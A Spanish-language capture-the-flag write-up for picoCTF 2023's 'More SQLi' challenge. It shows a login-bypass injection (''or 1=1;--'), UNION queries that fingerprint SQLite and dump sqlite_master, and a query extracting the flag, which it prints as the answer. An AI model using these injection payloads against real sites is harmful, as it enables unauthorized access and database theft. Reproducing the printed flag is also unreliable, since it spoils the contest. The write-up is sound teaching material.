#### Descripción

¿Puedes encontrar la bandera en este sitio web? Intenta encontrar la bandera [aquí](http://saturn.picoctf.net:49302/).

## Solución



Después del inicio de la instancia, picoCTF le proporcionará un enlace a la instancia en ejecución.

El sitio tiene pantalla de inicio de sesión:

[![Screenshot of the login screen](https://github.com/DanArmor/picoCTF-2023-writeup/raw/main/Web%20Exploitation/More%20SQLi/1.jpg)](https://github.com/DanArmor/picoCTF-2023-writeup/blob/main/Web%20Exploitation/More%20SQLi/1.jpg)

Si escribe nombre de usuario y pasa, recibirá este mensaje.`user``user`

[![Screenshot of the login screen](https://github.com/DanArmor/picoCTF-2023-writeup/raw/main/Web%20Exploitation/More%20SQLi/2.jpg)](https://github.com/DanArmor/picoCTF-2023-writeup/blob/main/Web%20Exploitation/More%20SQLi/2.jpg)

Así que ahora vemos la consulta de la solicitud de inicio de sesión, obviamente es una pista para nosotros, porque cuando conocemos la consulta, podemos entrar fácilmente con

`'or 1=1;--` En el campo:`pass`

[![Screenshot of the login screen](https://github.com/DanArmor/picoCTF-2023-writeup/raw/main/Web%20Exploitation/More%20SQLi/3.jpg)](https://github.com/DanArmor/picoCTF-2023-writeup/blob/main/Web%20Exploitation/More%20SQLi/3.jpg)

Porque la consulta de resultados será algo como esto:

`SELECT id FROM users WHERE password = '' or 1=1;--' and username = '123'`

Podemos probar algunas consultas para averiguar, qué DB se utiliza, y con esta consulta:

`123' UNION SELECT 1, sqlite_version(), 3;--`

ahora sabemos que este sitio está usando SQLite.

[![Screenshot of the site](https://github.com/DanArmor/picoCTF-2023-writeup/raw/main/Web%20Exploitation/More%20SQLi/4.jpg)](https://github.com/DanArmor/picoCTF-2023-writeup/blob/main/Web%20Exploitation/More%20SQLi/4.jpg)

Ahora podemos enumerar todas las tablas con esta consulta

`123' UNION SELECT name, sql, null from sqlite_master;--`

[![Scrennshot of tables](https://github.com/DanArmor/picoCTF-2023-writeup/raw/main/Web%20Exploitation/More%20SQLi/5.jpg)](https://github.com/DanArmor/picoCTF-2023-writeup/blob/main/Web%20Exploitation/More%20SQLi/5.jpg)

Aquí está la bandera, vamos a por ella.

`123' UNION SELECT flag, null, null from more_table;--`

![[Pasted image 20250327124824.png]]
**Respuesta en el formato del concurso:** 
`picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}`